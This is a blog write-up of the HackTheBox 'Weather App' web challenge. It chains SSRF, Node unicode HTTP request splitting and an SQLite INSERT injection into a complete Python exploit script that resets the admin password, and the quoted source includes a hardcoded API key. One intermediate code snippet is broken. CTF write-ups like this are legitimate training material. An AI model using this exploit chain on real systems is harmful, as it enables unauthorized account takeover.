@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>HackTheBox WEB: Weather App | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/htb_weatherapp/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>HackTheBox WEB: Weather App</h1>
+    <time datetime="2022-02-06T21:09:45&#43;02:00">February 06, 2022</time>
+  </header>
+  <h1 id="introduction-to-the-challenge">Introduction to the challenge</h1>
+<p>Upon visiting the url provided by the challenge, we&rsquo;re given a smiling man giving thumbs up.
+Along with the current city of our ISP and the temperature there.</p>
+<h1 id="what-the-web">What the Web</h1>
+<p>So let&rsquo;s visit the site again, but inspecting the requests using Burp Suite. This should
+give us more of an idea, of what is going on. (We also have source, which we will look
+at later).</p>
+<p>Upon visiting the website, we&rsquo;re sending the following post request.</p>
+<pre><code>POST /api/weather HTTP/1.1
+Host: 127.0.0.1:1337
+Content-Length: 80
+sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+sec-ch-ua-platform: &quot;Linux&quot;
+Content-Type: application/json
+Accept: */*
+Origin: http://127.0.0.1:1337
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:1337/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+{&quot;endpoint&quot;:&quot;api.openweathermap.org&quot;,&quot;city&quot;:&quot;CENSORED&quot;,&quot;country&quot;:&quot;CENSORED&quot;}
+</code></pre><p>So we&rsquo;re sending a POST request to 127.0.0.1:1337/api/weather. With JSON data that contains
+the endpoint for the api, and a city and country. This api is constant so why is it in the
+POST request here?</p>
+<h1 id="reading-the-source">Reading the source</h1>
+<p>Let&rsquo;s look at the source code for the weather api:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">HttpHelper</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../helpers/HttpHelper&#39;</span>);
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">getWeather</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">endpoint</span>, <span style="color:#a6e22e">city</span>, <span style="color:#a6e22e">country</span>) {
+
+        <span style="color:#75715e">// *.openweathermap.org is out of scope
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">apiKey</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10a62430af617a949055a46fa6dec32f&#39;</span>;
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">weatherData</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">HttpHelper</span>.<span style="color:#a6e22e">HttpGet</span>(<span style="color:#e6db74">&#34;http://${endpoint}/data/2.5/weather?q=${city},${country}&amp;units=metric&amp;appid=${apiKey}&#34;</span>);
+</code></pre></div><p>We see that we&rsquo;re allowing a GET request of the endpoint and the rest of the url. The first
+thought that popped to mind here was setting the endpoint myself in the JSON request, and
+then just adding a <code>lol?=</code> at the end. This way the rest of the url was cancelled out. Now
+we could decide the url ourselves. With a GET request, we can do Server-Side Request Forgery (SSRF).</p>
+<p>Let&rsquo;s investigate the rest of the source code, specifically I found the routes/index js interesting.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;HIT post /register&#34;</span>);
+
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">remoteAddress</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^.*:/</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>) {
+                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">end</span>();
+        }
+</code></pre></div><p>So the register route needs to be sent by <code>127.0.0.1</code>. If we somehow can exploit the SSRF, so that
+we can send POST requests, instead of GET requests, we&rsquo;ll be able to create new accounts. This didn&rsquo;t
+seem very useful at first, but it was the only route to explore.</p>
+<h1 id="server-side-request-forgery">Server Side Request Forgery</h1>
+<p>SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application
+and perform unauthorized actions. These trust relationships might exist in relation to the server itself,
+or in relation to other back-end systems within the same organization. The trust relationship here is partially
+that we get to set the endpoint. And partially that we need to register users using localhost. Sometimes the ip
+127.0.0.1, localhost, etc. are blacklisted, so one can use 2130706433, 017700000001, or register your own domain
+that resolves to 127.0.0.1..</p>
+<h1 id="turning-get-into-post">Turning GET into POST</h1>
+<p>Now this was a harder part to figure out. There&rsquo;s a technique called request smuggling, that is based upon the
+fact that usually there exists a front-end server, that sends multiple requests to the back-end server at once.
+This is done because it&rsquo;s a lot more performant, and makes thing go brrr. HTTP requests are sent one after another,
+and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins.
+One way of exploiting this is by setting the Content-Length as 0, so that the backend server processes this as no data,
+and then send another request afterwards</p>
+<p>So we could do something along the lines of:</p>
+<pre><code>/ HTTP/1.1
+Host: 127.0.0.1:1337
+Content-Length: 0
+
+POST /register HTTP/1.1
+Host: 127.0.0.1:1337
+Content-Type: application/x-www-form-urlencoded
+Content-Length: LENGTH OF PAYLOAD
+PAYLOAD
+
+GET /?lol=
+</code></pre><p>This would first make a GET-request which serves as the catalyst for the request smuggling. Then it will make a request
+to register (urlencoded) with a payload, and then ends with a GET to a non-existent url just to escape the rest of the
+url, used originally in the API weather request.</p>
+<h1 id="making-it-work">Making it work?</h1>
+<p>Now a quick google search for <code>node js 8 SSRF</code> yields the following url:
+<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a>
+I highly recommend going and having a quick read. TLDR:
+Unicode Node, weird, bad, allows for SSRF. I found that he had written a little
+script for turning the string into correct unicode:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">smuggle</span>(<span style="color:#a6e22e">data</span>) {
+  <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+  <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+    <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x21</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7F</span>) {
+      <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0100</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">c</span>
+    }
+    <span style="color:#a6e22e">output</span> <span style="color:#f92672">+=</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">c</span>)
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">output</span>
+}<span style="color:#e6db74">```
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">We made this into python:
+</span><span style="color:#e6db74">```</span><span style="color:#a6e22e">python</span>
+<span style="color:#a6e22e">def</span> <span style="color:#a6e22e">smuggle</span>(<span style="color:#a6e22e">req</span>)<span style="color:#f92672">:</span>
+    <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span>
+        <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>(<span style="color:#a6e22e">i</span>)
+        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x21</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7f</span><span style="color:#f92672">:</span>
+            <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0100</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">c</span>
+        <span style="color:#a6e22e">output</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">i</span>)
+</code></pre></div><p>Now we just need to figure out what to register, and we&rsquo;re done?</p>
+<h1 id="register-to-the-rescue">Register to the rescue</h1>
+<p>We&rsquo;ll look at the database.js, here&rsquo;s a peculiar line:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">async</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">pass</span>) {
+    <span style="color:#75715e">// TODO: add parameterization and roll public
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
+        <span style="color:#66d9ef">try</span> {
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO users (username, password) VALUES (&#39;${user}&#39;, &#39;${pass}&#39;)&#34;</span>;
+            <span style="color:#a6e22e">resolve</span>((<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>)));
+        } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+            <span style="color:#a6e22e">reject</span>(<span style="color:#a6e22e">e</span>);
+        }
+    });
+</code></pre></div><p>Now what made this interesting was the there was a TODO line, that said
+&ldquo;add parameterization&rdquo; This is a key factor in not falling short on
+defending against an SQL injection. Now we&rsquo;re using SQLite, so it
+would seem that we need to find an INSERT sql injection against
+SQLite. Now after a lot of googling, I found the &ldquo;ON CONFLICT(&rdquo; command
+that would test if something went wrong, and do something afterwads.
+We could now do:</p>
+<pre><code>INSERT INTO users ('admin', '1337') ON CONFLICT(username) DO UPDATE SET password = 'cave';--&quot;
+</code></pre><p>And like that we have a long exploit chain, that should work. We just need to
+add the url encoding part.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">smuggle</span>(req):
+    output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> req:
+        c <span style="color:#f92672">=</span> ord(i)
+        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x21</span> <span style="color:#f92672">or</span> c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7f</span>:
+            c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0100</span> <span style="color:#f92672">|</span> c
+
+        output <span style="color:#f92672">+=</span> chr(c)
+
+    <span style="color:#66d9ef">return</span> output
+
+<span style="color:#75715e"># Local host</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:1337&#34;</span>
+
+<span style="color:#75715e"># Remote</span>
+<span style="color:#75715e"># url = &#34;http://159.65.53.42:30748&#34;</span>
+
+<span style="color:#75715e"># Local, to ensure that the requests are send</span>
+<span style="color:#75715e"># from local to bypass the check.</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+
+
+sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username=admin&amp;password=&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;cave&#39;;--&#34;</span>
+sql <span style="color:#f92672">=</span> sql<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;%27&#34;</span>) <span style="color:#75715e">#\u0120</span>
+contentLength <span style="color:#f92672">=</span> len(sql)
+
+<span style="color:#75715e">#All lines must end with \r\n</span>
+<span style="color:#75715e">#If you&#39;re smuggling a new request</span>
+<span style="color:#75715e">#you must have an empty line with only \r\n</span>
+<span style="color:#75715e">#[*] Remember spaces</span>
+endpoint <span style="color:#f92672">=</span> smuggle(
+    <span style="color:#e6db74">&#39;/ HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;Host: &#39;</span><span style="color:#f92672">+</span>host<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;Content-Length: 0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;POST /register HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;Host: &#39;</span><span style="color:#f92672">+</span>host<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;Content-Length: &#39;</span><span style="color:#f92672">+</span>str(contentLength)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    sql  <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>
+    <span style="color:#e6db74">&#39;GET /?lol=&#39;</span>
+)
+
+endpoint <span style="color:#f92672">=</span> host<span style="color:#f92672">+</span>endpoint
+r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/api/weather&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;endpoint&#39;</span>: endpoint, <span style="color:#e6db74">&#39;city&#39;</span>: <span style="color:#e6db74">&#39;happiness&#39;</span>, <span style="color:#e6db74">&#39;country&#39;</span>: <span style="color:#e6db74">&#39;joy&#39;</span>})
+
+<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>text)
+</code></pre></div>
+</article>
+
+
+
+</html>
